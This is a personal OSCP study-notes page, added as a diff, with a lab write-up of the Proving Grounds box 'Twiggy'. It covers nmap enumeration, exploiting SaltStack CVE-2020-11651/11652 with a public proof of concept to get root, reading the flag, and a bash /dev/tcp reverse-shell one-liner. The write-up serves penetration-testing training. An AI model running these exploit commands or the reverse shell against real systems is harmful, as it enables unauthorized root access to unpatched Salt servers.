@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Challenge Labs · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">🗂️ Challenge Labs</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v10-oscp-knowledge-base-box-journal">OSCP+ KNOWLEDGE BASE — BOX JOURNAL</div>
+<h2 id="v10--challenge-labs-boxes-my-per-box-writeups">🗂️ CHALLENGE LABS &amp; BOXES — my per-box writeups<a class="anchor" href="#v10--challenge-labs-boxes-my-per-box-writeups">#</a></h2>
+<blockquote>Every machine I&#x27;ve rooted: the attack chain, exact commands, learnings, and rabbit holes to not repeat. Source files live in <code>OSCP-Challenge-Labs/</code>; add a box there and rebuild.</blockquote>
+<hr>
+<h1 id="v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)<a class="anchor" href="#v10-twiggy-proving-grounds-practice-linux-easy">#</a></h1>
+<ul>
+<li><strong>IP:</strong> 192.168.134.62   <strong>Date:</strong> 2026-10-08   <strong>Time to root:</strong> fast (recognition → PoC)</li>
+<li><strong>One-line:</strong> Spotted SaltStack by its 4505/4506 ZeroMQ ports → unauth RCE (CVE-2020-11651) → salt-master runs as <strong>root</strong> → read the flag directly.</li>
+</ul>
+<hr>
+<h2 id="v10-1-enumeration">1. Enumeration<a class="anchor" href="#v10-1-enumeration">#</a></h2>
+<p><strong>All-ports scan:</strong></p>
+<pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
+# open: 22, 53, 80, 4505, 4506, 8000
+nmap -p22,53,80,4505,4506,8000 -sCV -Pn -oN scans/services.txt $IP</code></pre>
+<p><strong>What each port was:</strong></p>
+<div class="tablewrap"><table><thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead><tbody>
+<tr><td>22</td><td>OpenSSH 7.4</td><td>payoff only</td></tr>
+<tr><td>53</td><td>NSD (DNS)</td><td>not the path</td></tr>
+<tr><td>80</td><td>nginx 1.16.1 — <strong>Mezzanine</strong> CMS</td><td>🐇 distraction</td></tr>
+<tr><td><strong>4505 / 4506</strong></td><td><strong>ZeroMQ ZMTP 2.0</strong></td><td>🎯 <strong>SaltStack salt-master</strong></td></tr>
+<tr><td>8000</td><td>nginx, returns JSON</td><td><strong>salt-api</strong> (2nd door to the same bug)</td></tr>
+</tbody></table></div>
+<p><strong>🔑 The tell:</strong> <code>4505 + 4506</code> open together = <strong>SaltStack</strong>. That pair is a dead giveaway — jump straight to it, ignore the CMS.</p>
+<h2 id="v10-2-foothold-root-salt-master-runs-as-root">2. Foothold = Root (salt-master runs as root)<a class="anchor" href="#v10-2-foothold-root-salt-master-runs-as-root">#</a></h2>
+<p>There was no separate user→root step: <strong>the salt-master process runs as root</strong>, so unauth RCE on it *is* root.</p>
+<p><strong>Vector:</strong> CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → unauthenticated RCE. Vulnerable on Salt &lt; 2019.2.4 / &lt; 3000.2.</p>
+<p><strong>Steps + commands:</strong></p>
+<pre><code># get + read the PoC
+git clone https://github.com/jasperla/CVE-2020-11651-poc &amp;&amp; cd CVE-2020-11651-poc
+# it needs the salt python lib (Kali dropped salt-common from apt → use pip):
+pip3 install salt msgpack --break-system-packages
+
+export IP=192.168.134.62
+
+# confirm vulnerable + prove exec (blind):
+python3 exploit.py --master $IP --exec &quot;id&quot;
+#   → &quot;Checking if vulnerable to CVE-2020-11651... YES&quot;
+#   → &quot;root key obtained: ...&quot;
+#   → &quot;Successfully scheduled job&quot; (ran, but --exec shows NO output = blind)
+
+# read the flag directly as root (the winning move):
+python3 exploit.py --master $IP --read /root/proof.txt      # → proof.txt 🏁</code></pre>
+<ul>
+<li><strong>proof.txt:</strong> <code>[captured]</code></li>
+</ul>
+<p><strong>For a full interactive root shell (optional):</strong></p>
+<pre><code># Kali: nc -lvnp 443
+python3 exploit.py --master $IP --exec &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/443 0&gt;&amp;1&#x27;&quot;
+# then: find / -name local.txt 2&gt;/dev/null ; cat /root/proof.txt</code></pre>
+<h2 id="v10-3-learnings-tips">3. Learnings &amp; tips<a class="anchor" href="#v10-3-learnings-tips">#</a></h2>
+<ul>
+<li><strong>Port recognition wins boxes.</strong> <code>4505/4506 (ZeroMQ)</code> → SaltStack, instantly. Memorise service-by-port tells.</li>
+<li><strong>Ask &quot;what user does the service run as?&quot;</strong> salt-master = root, so the exploit IS the privesc. No local enum needed.</li>
+<li><strong>Blind RCE → route output to yourself.</strong> <code>--exec &quot;id&quot;</code> ran but printed nothing (blind). Don&#x27;t fight it — use the file-<strong>read</strong> primitive (<code>--read</code>) or fire a <strong>reverse shell</strong>.</li>
+<li><strong>Kali deps on modern Kali:</strong> <code>apt</code> no longer has <code>salt-common</code>; use <code>pip3 install salt msgpack --break-system-packages</code> (or a venv).</li>
+</ul>
+<h2 id="v10-4-rabbit-holes-mistakes">4. Rabbit holes / mistakes<a class="anchor" href="#v10-4-rabbit-holes-mistakes">#</a></h2>
+<ul>
+<li>⚠️ <strong>Mezzanine CMS on :80</strong> is a distraction — don&#x27;t enumerate it; the Salt port is the obvious, faster path.</li>
+<li>⚠️ **Shell variable <code>$IP</code> not set in the new tab** → <code>--master $IP</code> gave &quot;expected one argument&quot;. Variables are per-tab; <code>export IP=...</code> in each tab.</li>
+<li>⚠️ <strong>Reverse-shell IP = the TARGET by mistake</strong> (<code>/dev/tcp/192.168.134.62/...</code>). It must be <strong>your Kali</strong> <code>tun0</code> IP. Target = where you attack; Kali = where the shell comes home.</li>
+</ul>
+<h2 id="v10-5-kb-tags-used">5. KB tags used<a class="anchor" href="#v10-5-kb-tags-used">#</a></h2>
+<ul>
+<li><code class="tag">[ENUM-SALTSTACK]</code> · <code class="tag">[PORT-PLAYBOOK]</code> · <code class="tag">[ENUM-UNUSUAL-PORTS]</code> · <code class="tag">[EXPLOIT-RESEARCH]</code> · <code class="tag">[SHELL-QUICK]</code> (reverse shell) · <code class="tag">[REVERSE-SHELL-NOT-CONNECTING]</code> (the Kali-vs-target fix)</li>
+</ul>
+<hr></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
